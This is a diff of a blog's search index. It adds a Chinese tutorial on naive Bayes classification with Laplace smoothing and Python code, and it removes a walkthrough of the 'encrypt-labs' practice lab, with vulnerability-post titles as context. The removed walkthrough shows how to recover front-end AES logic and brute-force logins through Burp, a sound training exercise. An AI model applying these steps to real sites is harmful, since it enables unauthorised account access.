+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229162548528.png"
+                      class="" title="image-20251229162548528"
+                > 
+<p><strong>右边那个表是单词出现的条件概率表</strong>  </p>
+<p>两个条件概率相除，分子是Postivity事件下的单词出现概率，下面是Negtivity下的单词出现概率，由于today不在词表里面，故不用统计。</p>
+<h2 id="朴素贝叶斯条件推理下的二元分类"><a href="#朴素贝叶斯条件推理下的二元分类" class="headerlink" title="朴素贝叶斯条件推理下的二元分类"></a>朴素贝叶斯条件推理下的二元分类</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229162749424.png"
+                      class="" title="image-20251229162749424"
+                > 
+
+<h2 id="拉普拉斯平滑"><a href="#拉普拉斯平滑" class="headerlink" title="拉普拉斯平滑"></a>拉普拉斯平滑</h2><p>当我们基于样本统计计算概率时，如果某个事件（如某个特征、某个 n-gram 组合）在训练集中<strong>从未出现过</strong>，其统计概率会为 0，这会导致：</p>
+<ul>
+<li>后续的概率乘积直接变为 0（比如朴素贝叶斯的后验概率计算）；</li>
+<li>模型完全忽略该事件的可能性，泛化能力极差。</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229163528929.png"
+                      class="" title="image-20251229163528929"
+                > 
+
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假设我们要做 “水果 &#x2F; 蔬菜” 二分类，特征是 “是否包含某单词”，训练数据如下：</p>
+<table>
+<thead>
+<tr>
+<th>文本</th>
+<th>类别</th>
+<th>包含的单词</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>苹果很甜</td>
+<td>水果</td>
+<td>苹果、很甜</td>
+</tr>
+<tr>
+<td>香蕉软糯</td>
+<td>水果</td>
+<td>香蕉、软糯</td>
+</tr>
+<tr>
+<td>黄瓜脆爽</td>
+<td>蔬菜</td>
+<td>黄瓜、脆爽</td>
+</tr>
+<tr>
+<td>番茄多汁</td>
+<td>蔬菜</td>
+<td>番茄、多汁</td>
+</tr>
+</tbody></table>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229164051636.png"
+                      class=""
+                > 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229164106200.png"
+                      class="" title="image-20251229164106200"
+                > 
+
+<p>特征维度是所有可能去值得特征值数</p>
+<p><strong>由于该数据具有对称性，水果和蔬菜都是2:2，所以如果概率相同，那先访问的类别是蔬菜的话就会将苹果判断为蔬菜。</strong> </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _calc_word_prob(self, word, label): # word是要计算的单词，如苹果 label 是标签，水果或者蔬菜</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        核心方法：计算P(单词|类别)，应用拉普拉斯平滑避免零概率</span><br><span class="line">        公式：P(f|c) = (count(f,c) + 1) / (count(c) + N*1)</span><br><span class="line">            count(f,c)：类别c中单词f的出现次数</span><br><span class="line">            count(c)：类别c的总词数</span><br><span class="line">            N：词汇表大小（特征维度）</span><br><span class="line">        Args:</span><br><span class="line">            word (str): 待计算概率的单词</span><br><span class="line">            label (str): 目标类别</span><br><span class="line">        Returns:</span><br><span class="line">            float: 平滑后的条件概率值（0~1之间）</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 获取该类别下该单词的出现次数（未出现则为0）</span><br><span class="line">        word_count = self.class_word_count[label].get(word, 0)</span><br><span class="line">        # 获取该类别下的总词数</span><br><span class="line">        total_count = self.class_total_count[label]</span><br><span class="line">        # 拉普拉斯平滑计算条件概率</span><br><span class="line">        prob = (word_count + 1) / (total_count + self.vocab_size)</span><br><span class="line">        return prob</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="定义数据类型"><a href="#定义数据类型" class="headerlink" title="定义数据类型"></a>定义数据类型</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229170452414.png"
+                      class="" title="image-20251229170452414"
+                > 
+<p>用于统计某个词出现的个数。<br>例如字典：</p>
+<ul>
+<li>统计苹果在水果标签下出现的次数，苹果在蔬菜标签下出现的次数</li>
+<li>统计标签出现的次数，如水果下出现的单词的总数</li>
+<li>存储苹果，水果，蔬菜，香蕉，黄瓜等所有特征值</li>
+<li>存储所有类别，就是水果和蔬菜</li>
+</ul>
+<h3 id="统计个数"><a href="#统计个数" class="headerlink" title="统计个数"></a>统计个数</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229170902050.png"
+                      class="" title="image-20251229170902050"
+                > 
+
+<h3 id="拉普拉斯平滑-1"><a href="#拉普拉斯平滑-1" class="headerlink" title="拉普拉斯平滑"></a>拉普拉斯平滑</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229170953605.png"
+                      class="" title="image-20251229170953605"
+                > 
+
+<p>实现这个条件概率公式计算</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229163528929.png"
+                      class="" title="image-20251229163528929"
+                > 
+
+<h3 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h3><p>这个<code>predict</code>方法是<strong>朴素贝叶斯分类的核心预测逻辑</strong>，本质是通过「贝叶斯定理」计算文本属于每个类别的后验概率，最终选择概率最大的类别作为预测结果。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229172504537.png"
+                      class="" title="image-20251229172504537"
+                >  
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229171633774.png"
+                      class="" title="image-20251229171633774"
+                > 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229171651025.png"
+                      class="" title="image-20251229171651025"
+                > 
+
+<p>由P(text|c)它是似然概率，即不同产品在该类别下的概率的乘积。故不能有概率为0的事件，所以进行拉普拉斯变换。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 计算先验概率P(类别)：该类别总词数 / 所有类别总词数之和</span><br><span class="line">            prior = self.class_total_count[cls] / sum(self.class_total_count.values())</span><br><span class="line">            log_prior = np.log(prior)</span><br><span class="line">这里是计算P(C),然后取对数log(P(C))</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 2. 计算条件概率的对数和：sum(log(P(单词|类别)))</span><br><span class="line">            log_likelihood = 0</span><br><span class="line">            for word in words:</span><br><span class="line">                # 获取当前单词在该类别下的条件概率</span><br><span class="line">                prob = self._calc_word_prob(word, cls)</span><br><span class="line">                # 累加对数概率（避免连乘导致数值过小）</span><br><span class="line">                log_likelihood += np.log(prob)</span><br><span class="line"> 这里是计算在类别下的单词出现概率 P(word|C),然后取对数相加</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229172344255.png"
+                      class="" title="image-20251229172344255"
+                > 
+
+<h2 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from collections import defaultdict</span><br><span class="line"></span><br><span class="line">class NaiveBayesWithLaplace:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    带拉普拉斯平滑的朴素贝叶斯分类器（适用于文本分类）</span><br><span class="line">    核心解决：离散特征的零概率问题，保证概率分布的完整性</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def __init__(self):</span><br><span class="line">        # 统计字典：key=类别，value=子字典（key=单词，value=该单词在该类别下的出现次数）</span><br><span class="line">        self.class_word_count = defaultdict(lambda: defaultdict(int))</span><br><span class="line">        # 统计字典：key=类别，value=该类别下所有单词的总出现次数</span><br><span class="line">        self.class_total_count = defaultdict(int)</span><br><span class="line">        # 集合：存储所有出现过的唯一单词（构建词汇表，用于确定拉普拉斯平滑的特征维度N）</span><br><span class="line">        self.vocab = set()</span><br><span class="line">        # 集合：存储所有类别（如示例中的&quot;水果&quot;、&quot;蔬菜&quot;）</span><br><span class="line">        self.classes = set()</span><br><span class="line"></span><br><span class="line">    def fit(self, texts, labels):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        训练模型：统计每个类别下的词频、总词数，构建词汇表</span><br><span class="line">        Args:</span><br><span class="line">            texts (list): 训练文本列表，每个元素是空格分隔的字符串（如[&quot;苹果 很甜&quot;, &quot;香蕉 软糯&quot;]）</span><br><span class="line">            labels (list): 训练文本对应的类别标签列表（如[&quot;水果&quot;, &quot;水果&quot;]）</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 遍历每个文本-标签对，统计词频</span><br><span class="line">        for text, label in zip(texts, labels):</span><br><span class="line">            # 将文本按空格切分为单词列表</span><br><span class="line">            words = text.split()</span><br><span class="line">            # 记录所有出现过的类别</span><br><span class="line">            self.classes.add(label)</span><br><span class="line">            # 遍历当前文本的每个单词，更新统计信息</span><br><span class="line">            for word in words: # word是text分开之后的数据 “苹果 很甜“</span><br><span class="line">                # 该类别下该单词的计数+1</span><br><span class="line">                self.class_word_count[label][word] += 1</span><br><span class="line">                # 该类别下的总词数+1</span><br><span class="line">                self.class_total_count[label] += 1</span><br><span class="line">                # 将单词加入词汇表（自动去重）</span><br><span class="line">                self.vocab.add(word)</span><br><span class="line">        # 词汇表大小 = 特征维度N（拉普拉斯平滑公式中的关键参数）</span><br><span class="line">        self.vocab_size = len(self.vocab)  </span><br><span class="line"></span><br><span class="line">    def _calc_word_prob(self, word, label):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        核心方法：计算P(单词|类别)，应用拉普拉斯平滑避免零概率</span><br><span class="line">        公式：P(f|c) = (count(f,c) + 1) / (count(c) + N*1)</span><br><span class="line">            count(f,c)：类别c中单词f的出现次数</span><br><span class="line">            count(c)：类别c的总词数</span><br><span class="line">            N：词汇表大小（特征维度）</span><br><span class="line">        Args:</span><br><span class="line">            word (str): 待计算概率的单词</span><br><span class="line">            label (str): 目标类别</span><br><span class="line">        Returns:</span><br><span class="line">            float: 平滑后的条件概率值（0~1之间）</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 获取该类别下该单词的出现次数（未出现则为0）</span><br><span class="line">        word_count = self.class_word_count[label].get(word, 0)</span><br><span class="line">        # 获取该类别下的总词数</span><br><span class="line">        total_count = self.class_total_count[label]</span><br><span class="line">        # 拉普拉斯平滑计算条件概率</span><br><span class="line">        prob = (word_count + 1) / (total_count + self.vocab_size)</span><br><span class="line">        return prob</span><br><span class="line"></span><br><span class="line">    def predict(self, text):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        预测文本类别：计算每个类别的后验概率（对数形式避免数值下溢）</span><br><span class="line">        后验概率公式（对数）：log(P(c|text)) ∝ log(P(c)) + sum(log(P(word|c)))</span><br><span class="line">            P(c)：类别c的先验概率（训练集中该类别的词数占比）</span><br><span class="line">            P(word|c)：每个单词在类别c下的条件概率</span><br><span class="line">        Args:</span><br><span class="line">            text (str): 待预测的文本（空格分隔的字符串）</span><br><span class="line">        Returns:</span><br><span class="line">            str: 预测的类别标签</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 将待预测文本切分为单词列表</span><br><span class="line">        words = text.split()</span><br><span class="line">        # 初始化最大后验概率（负无穷，确保第一个类别能被选中）</span><br><span class="line">        max_prob = -np.inf</span><br><span class="line">        # 初始化最优类别</span><br><span class="line">        best_class = None</span><br><span class="line"></span><br><span class="line">        # 遍历每个类别，计算该类别的后验概率</span><br><span class="line">        for cls in self.classes:</span><br><span class="line">            # 1. 计算先验概率P(类别)：该类别总词数 / 所有类别总词数之和</span><br><span class="line">            prior = self.class_total_count[cls] / sum(self.class_total_count.values())</span><br><span class="line">            log_prior = np.log(prior)</span><br><span class="line"></span><br><span class="line">            # 2. 计算条件概率的对数和：sum(log(P(单词|类别)))</span><br><span class="line">            log_likelihood = 0</span><br><span class="line">            for word in words:</span><br><span class="line">                # 获取当前单词在该类别下的条件概率</span><br><span class="line">                prob = self._calc_word_prob(word, cls)</span><br><span class="line">                # 累加对数概率（避免连乘导致数值过小）</span><br><span class="line">                log_likelihood += np.log(prob)</span><br><span class="line"></span><br><span class="line">            # 3. 总后验概率（对数形式）：先验概率对数 + 条件概率对数和</span><br><span class="line">            total_log_prob = log_prior + log_likelihood</span><br><span class="line"></span><br><span class="line">            # 打印每个类别的中间计算结果（便于分析）</span><br><span class="line">            print(f&quot;类别「&#123;cls&#125;」：先验概率对数=&#123;log_prior:.4f&#125;，条件概率对数和=&#123;log_likelihood:.4f&#125;，总后验概率对数=&#123;total_log_prob:.4f&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            # 4. 更新最优类别（保留后验概率最大的类别）</span><br><span class="line">            if total_log_prob &gt; max_prob:</span><br><span class="line">                max_prob = total_log_prob</span><br><span class="line">                best_class = cls</span><br><span class="line"></span><br><span class="line">        # 返回预测的最优类别</span><br><span class="line">        return best_class</span><br><span class="line"></span><br><span class="line"># ---------------------- 非对称测试示例 ----------------------</span><br><span class="line"># 非对称训练数据：水果类5条（词数多），蔬菜类2条（词数少）</span><br><span class="line">train_texts = [</span><br><span class="line">    &quot;苹果 很甜&quot;, &quot;苹果 香甜&quot;, &quot;香蕉 软糯&quot;, &quot;草莓 酸甜&quot;, &quot;橙子 多汁&quot;,  # 水果类（5条）</span><br><span class="line">    &quot;黄瓜 脆爽&quot;, &quot;番茄 沙甜&quot;                                       # 蔬菜类（2条）</span><br><span class="line">]</span><br><span class="line">train_labels = [</span><br><span class="line">    &quot;水果&quot;, &quot;水果&quot;, &quot;水果&quot;, &quot;水果&quot;, &quot;水果&quot;,  # 水果类标签</span><br><span class="line">    &quot;蔬菜&quot;, &quot;蔬菜&quot;                           # 蔬菜类标签</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 1. 初始化带拉普拉斯平滑的朴素贝叶斯模型</span><br><span class="line">nb = NaiveBayesWithLaplace()</span><br><span class="line"># 2. 训练模型：统计词频、构建词汇表</span><br><span class="line">nb.fit(train_texts, train_labels)</span><br><span class="line"></span><br><span class="line"># 3. 预测测试文本的类别（仍用「苹果 脆爽」）</span><br><span class="line">test_text = &quot;苹果 脆爽&quot;</span><br><span class="line">pred = nb.predict(test_text)</span><br><span class="line"># 输出预测结果</span><br><span class="line">print(f&quot;\n文本「&#123;test_text&#125;」的预测类别：&#123;pred&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 4. 输出关键概率，验证拉普拉斯平滑效果</span><br><span class="line">print(&quot;\n=== 平滑后的概率 ===&quot;)</span><br><span class="line">for cls in [&quot;水果&quot;, &quot;蔬菜&quot;]:</span><br><span class="line">    # 计算P(苹果|类别)</span><br><span class="line">    p_apple = nb._calc_word_prob(&quot;苹果&quot;, cls)</span><br><span class="line">    # 计算P(脆爽|类别)</span><br><span class="line">    p_crisp = nb._calc_word_prob(&quot;脆爽&quot;, cls)</span><br><span class="line">    # 格式化输出（保留4位小数）</span><br><span class="line">    print(f&quot;P(苹果|&#123;cls&#125;) = &#123;p_apple:.4f&#125;, P(脆爽|&#123;cls&#125;) = &#123;p_crisp:.4f&#125;&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229172914687.png"
+                      class="" title="image-20251229172914687"
+                > 
+
+]]></content>
+      <tags>
+        <tag>朴素贝叶斯</tag>
+        <tag>拉普拉斯平滑</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
     <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2><img  
@@ -3282,217 +3718,6 @@
       <tags>
         <tag>泛微</tag>
         <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>encrypt-labs</title>
-    <url>/2025/03/28/encrypt-labs/</url>
-    <content><![CDATA[<p>项目地址：<code>https://github.com/SwagXz/encrypt-labs</code></p>
-<p>作者：<code>SwagXz</code></p>
-<p>现在日子越来越不好过了，无论攻防、企业src还是渗透项目，总能看到大量的存在加密的网站，XZ师傅的前端加密靶场还是很值得做一做的，环境很贴合实战会遇到的一些情况，本人web小菜鸡练完之后反正是收获颇丰，推荐给各位师傅。</p>
-<p>之前自己在学习前端加解密经常遇到加密解不了的情况；之后慢慢看师傅们的文章，也学到了很多绕过技术，于是写了个简单的靶场，为之后的师傅们铺路学习,加密方式列出了我经常见的8种方式包含非对称加密、对称加密、加签以及禁止重放的测试场景，比如AES、DES、RSA，用于渗透测试加解密练习。希望可以帮助到最近在学习这块知识的师傅，靶场函数.很简单，和实战相比还是差的有点多，不过应该够入门了</p>
-<p>默认密码：admin&#x2F;123456</p>
-<p>js代码被混淆，无混淆地址在url后添加easy.php</p>
-<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p><a class="link"   href="https://github.com/SwagXz/encrypt-labs?tab=readme-ov-file" >https://github.com/SwagXz/encrypt-labs?tab=readme-ov-file<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p>所需条件<strong>Nginx+mysql+php8</strong> </p>
- 
-
-<p>phpstudy的软件管理可以安装php8</p>
- 
-
-<p>开启mysql+nginx</p>
- 
-
-<p>创建网站，将压缩包解压的网站源码放到www目录下</p>
- 
-
-<p>然后修改database.php</p>
- 
-
-<p>修改数据库的账号密码，默认的不是root&#x2F;root</p>
- 
-
-<p>然后新建一个encryptdb的数据库并且导入.sql数据库执行文件即可。</p>
- 
-
-<p>账号&#x2F;密码 ： admin&#x2F;123456</p>
-<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>因为我们需要用到burp抓包且我是虚拟机搭建。网站访问的时候需要使用虚拟机的ip地址去访问网站，burp默认不住啊本地地址，使用未混淆的代码进行初步学习，记得在url加上<em>easy.php</em> </p>
- 
-
-<p>我们使用爆破的方式去测试吧。模拟我们不知道密码的情况下。</p>
-<ul>
-<li>未加密的网站：直接intruder模块爆棚</li>
-<li>加密的网站：需要将参数进行加密过后再进行爆棚</li>
-</ul>
-<h2 id="AES固定key"><a href="#AES固定key" class="headerlink" title="AES固定key"></a>AES固定key</h2><h3 id="加密分析"><a href="#加密分析" class="headerlink" title="加密分析"></a>加密分析</h3><p>输入错误密码：admin&#x2F;admin</p>
- 
-
-<p>发现本应该为admin&#x2F;admin的参数变成了encryptedData&#x3D;nArXfVdnoe67UzojAPP2X%2B6qSiznLMBAI3a5Bi%2BzlNyFzdExDwmDvIKgDjWWWrZ2</p>
-<p>去前端打上断点看一下加密逻辑</p>
-<p>我的习惯是打开网络请求看一下堆栈。然后再打断点</p>
-  
-<p>输入账号密码点击登陆<br>然后点击发起程序就可以看到调用栈了。这里很简单的就可以看出来，onclick进行了点击操作。那sendDataAes就是进行了对数据的加密以及发送操作的，所以我们点进去看一下前端js代码。</p>
-  
-
-<p>此时我们就可以知道数据被加密的流程。我们可以在控制台尝试一下，不过我们可以先断点获取我们输入的数据被加密前最后一步的格式，直接复制数据。</p>
- 
-
-<p>jsonData: “{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;}”就是我们数据被加密前的格式。然后我们可以复制加密代码放到控制台</p>
- 
-
-<p>对比一下burp里面的。发现后续还有url编码，那我们就将他再url编码一下</p>
- 
-
-<p>发现一摸一样。所以我们就拿到了他的前端加密方式</p>
-<h3 id="autoDecoder"><a href="#autoDecoder" class="headerlink" title="autoDecoder"></a>autoDecoder</h3><p>在burp上安装autoDecoder插件 <a class="link"   href="https://github.com/f0ng/autoDecoder/releases/tag/0.52" >https://github.com/f0ng/autoDecoder/releases/tag/0.52<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-  
-
-<p>这里一定要保存配置，可以取一个名字为AES_key</p>
-<p>然后配置需要加密的域名</p>
- 
-
-<p>这里也要保存，也可以保存为相同的名字AES_key</p>
-<p>然后我们将一个加密的数据包发到repeater那里去看看</p>
- 
-
-<p>多出来了一个这个模块</p>
- 
-
-<p>自动帮我将数据包解密成原文了，且是对的，然后我们把参数改成原文</p>
- 
-
-<p>不用像网上别人那种右上角有个autoRepeater，也不用选中再加密，直接<strong>Send</strong> </p>
-<p>然后修改我们的密码为正确的密码</p>
- 
-
-<p>然后我们可以在logger日志这个地方看一下我们加密发的包</p>
- 
-
-<p>数据被正确加密了</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>提取词类频率以及朴素贝叶斯</title>
-    <url>/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/</url>
-    <content><![CDATA[<h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><h2 id="提取特征值"><a href="#提取特征值" class="headerlink" title="提取特征值"></a>提取特征值</h2> 
-
-<p>有一个词汇表，然后根据输入的语句根据出现的次数标记特征值。<em>because出现了1次，故特征值标记为1</em> 由于要训练的数据为n+1，所以会造成训练时间和预测时间过长</p>
- 
-
-<h2 id="正负频率提取特征值"><a href="#正负频率提取特征值" class="headerlink" title="正负频率提取特征值"></a>正负频率提取特征值</h2> 
-
-<p>根据每个词在积极的文章和消极的文章中的出现次数来统计，将一条推文转换成3维向量。</p>
-<p><em>如果说根据每个词的频率组成的向量是N纬的话，那可以转换成3维</em> </p>
- 
-<p>统计方式</p>
- 
-
-<h2 id="预处理-1"><a href="#预处理-1" class="headerlink" title="预处理"></a>预处理</h2><h3 id="停用词"><a href="#停用词" class="headerlink" title="停用词"></a>停用词</h3> 
-
-<p>停用词列表里的词需要被删除</p>
-<h3 id="标点符号"><a href="#标点符号" class="headerlink" title="标点符号"></a>标点符号</h3> 
-<p>按需查看是否需要删除标点符号，看是否NLP任务所需要</p>
-<h3 id="提取词干"><a href="#提取词干" class="headerlink" title="提取词干"></a>提取词干</h3><p>提取词干减少词表的形式</p>
- 
-
-<p><em>如：tuning去掉ing是由tun，他的动词形式tune变换而来。然后要采取小写的形式</em> </p>
-<p>因为要处理多条推文，所以将得到一个矩阵</p>
- 
-
-<ol>
-<li>构建频率字典。</li>
-<li>初始化矩阵匹配推文数量m，因为是一个3列矩阵，让他为（m，3）的矩阵。</li>
-<li>进行词干提取，以及上面讲的删掉停用词以及一些标点符号，全部转换成小写。</li>
-<li>统计推文正负词频率来提取特征值。</li>
-</ol>
-<h1 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h1> 
-
-<p>朴素贝叶斯采用条件概率，I&#x3D;&#x3D;0.24这个意思是I这个单词在happy条件下的概率为0.24.然后对比之下发现。中性词在happy和sad条件下的条件概率几乎相等。他们对情感影响几乎没有。而表达happy和sad的词之间的差距很大。<br><strong>由于beacause只在Positivity的语句中出现，故无法进行概率比较，所以要进行平滑处理。</strong> </p>
- 
-<p><strong>右边那个表是单词出现的条件概率表</strong>  </p>
-<p>两个条件概率相除，分子是Postivity事件下的单词出现概率，下面是Negtivity下的单词出现概率，由于today不在词表里面，故不用统计。</p>
-<h2 id="朴素贝叶斯条件推理下的二元分类"><a href="#朴素贝叶斯条件推理下的二元分类" class="headerlink" title="朴素贝叶斯条件推理下的二元分类"></a>朴素贝叶斯条件推理下的二元分类</h2> 
-
-<h2 id="拉普拉斯平滑"><a href="#拉普拉斯平滑" class="headerlink" title="拉普拉斯平滑"></a>拉普拉斯平滑</h2><p>当我们基于样本统计计算概率时，如果某个事件（如某个特征、某个 n-gram 组合）在训练集中<strong>从未出现过</strong>，其统计概率会为 0，这会导致：</p>
-<ul>
-<li>后续的概率乘积直接变为 0（比如朴素贝叶斯的后验概率计算）；</li>
-<li>模型完全忽略该事件的可能性，泛化能力极差。</li>
-</ul>
- 
-
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假设我们要做 “水果 &#x2F; 蔬菜” 二分类，特征是 “是否包含某单词”，训练数据如下：</p>
-<table>
-<thead>
-<tr>
-<th>文本</th>
-<th>类别</th>
-<th>包含的单词</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>苹果很甜</td>
-<td>水果</td>
-<td>苹果、很甜</td>
-</tr>
-<tr>
-<td>香蕉软糯</td>
-<td>水果</td>
-<td>香蕉、软糯</td>
-</tr>
-<tr>
-<td>黄瓜脆爽</td>
-<td>蔬菜</td>
-<td>黄瓜、脆爽</td>
-</tr>
-<tr>
-<td>番茄多汁</td>
-<td>蔬菜</td>
-<td>番茄、多汁</td>
-</tr>
-</tbody></table>
- 
- 
-
-<p>特征维度是所有可能去值得特征值数</p>
-<p><strong>由于该数据具有对称性，水果和蔬菜都是2:2，所以如果概率相同，那先访问的类别是蔬菜的话就会将苹果判断为蔬菜。</strong> </p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _calc_word_prob(self, word, label): # word是要计算的单词，如苹果 label 是标签，水果或者蔬菜</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        核心方法：计算P(单词|类别)，应用拉普拉斯平滑避免零概率</span><br><span class="line">        公式：P(f|c) = (count(f,c) + 1) / (count(c) + N*1)</span><br><span class="line">            count(f,c)：类别c中单词f的出现次数</span><br><span class="line">            count(c)：类别c的总词数</span><br><span class="line">            N：词汇表大小（特征维度）</span><br><span class="line">        Args:</span><br><span class="line">            word (str): 待计算概率的单词</span><br><span class="line">            label (str): 目标类别</span><br><span class="line">        Returns:</span><br><span class="line">            float: 平滑后的条件概率值（0~1之间）</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 获取该类别下该单词的出现次数（未出现则为0）</span><br><span class="line">        word_count = self.class_word_count[label].get(word, 0)</span><br><span class="line">        # 获取该类别下的总词数</span><br><span class="line">        total_count = self.class_total_count[label]</span><br><span class="line">        # 拉普拉斯平滑计算条件概率</span><br><span class="line">        prob = (word_count + 1) / (total_count + self.vocab_size)</span><br><span class="line">        return prob</span><br></pre></td></tr></table></figure></div>
-
